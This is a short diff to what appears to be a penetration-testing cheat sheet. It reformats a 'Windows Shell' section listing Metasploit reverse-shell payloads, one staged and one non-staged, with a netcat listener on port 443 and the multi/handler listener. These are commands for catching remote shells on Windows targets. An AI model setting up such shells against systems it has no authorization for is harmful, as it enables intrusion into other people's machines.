@@ -142,7 +142,8 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 
 
 ## Windows Shell
-Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
-Staged : (windows/shell/reverse_tcp) && use exploit/multi/handler
-
+```sh 
+//Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
+//Staged : (windows/shell/reverse_tcp) && use exploit/multi/handler
+```
 
